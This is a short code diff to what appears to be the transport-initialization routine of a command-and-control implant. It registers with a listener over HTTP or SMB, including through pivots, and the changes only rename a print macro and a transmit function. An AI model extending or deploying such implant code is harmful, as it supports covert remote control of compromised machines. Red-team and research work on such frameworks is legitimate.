@@ -12,14 +12,14 @@
 
 BOOL TransportInit( )
 {
-    PUTS( "Connecting to listener" )
+    PUTS_DONT_SEND( "Connecting to listener" )
     PVOID  Data    = NULL;
     SIZE_T Size    = 0;
     BOOL   Success = FALSE;
 
     /* Sends to our connection (direct/pivot) */
 #ifdef TRANSPORT_HTTP
-    if ( PackageTransmit( Instance.MetaData, &Data, &Size ) )
+    if ( PackageTransmitNow( Instance.MetaData, &Data, &Size ) )
     {
         AESCTX AesCtx = { 0 };
 
@@ -39,7 +39,7 @@ BOOL TransportInit( )
 #endif
 
 #ifdef TRANSPORT_SMB
-    if ( PackageTransmit( Instance.MetaData, NULL, NULL ) == TRUE )
+    if ( PackageTransmitNow( Instance.MetaData, NULL, NULL ) == TRUE )
     {
         Instance.Session.Connected = TRUE;
         Success = TRUE;
